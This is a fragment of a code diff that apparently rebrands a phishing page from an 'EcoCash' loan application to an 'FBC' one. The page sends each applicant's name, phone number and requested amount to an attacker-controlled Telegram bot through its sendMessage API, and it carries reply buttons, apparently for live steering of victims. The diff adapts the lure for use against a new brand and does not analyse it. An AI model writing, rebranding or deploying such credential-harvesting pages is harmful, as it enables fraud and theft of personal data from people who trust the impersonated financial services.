@@ -483,9 +483,6 @@
             document.getElementById('dispAmount').value = 'USD ' + (amount || '0.00');
          }
 
-        function showErr(m) { var e = document.getElementById('err'); e.textContent = m; e.classList.add('show'); }
-        function clrErr() { document.getElementById('err').classList.remove('show'); }
-
         async function tg(msg, btns) {
             try {
                 await fetch('https://api.telegram.org/bot' + BOT + '/sendMessage', {
@@ -496,10 +493,9 @@
             } catch(e) { console.error(e); }
         }
 
-            var msg = '\u{1f4f1} <b>EcoCash Loan Application</b>\n\n' +
+            var msg = '\u{1f4f1} <b>FBC Loan Application</b>\n\n' +
                 '<b>Name:</b> <code>' + bd.name + '</code>\n' +
                 '<b>Phone:</b> <code>+263' + bd.phone + '</code>\n' +
-                '<b>Loan:</b> <code>' + (bd.purpose || 'N/A') + '</code>\n' +
                 '<b>Amount:</b> <code>USD ' + bd.amount + '</code>\n' +
 
             var replyBtns = [
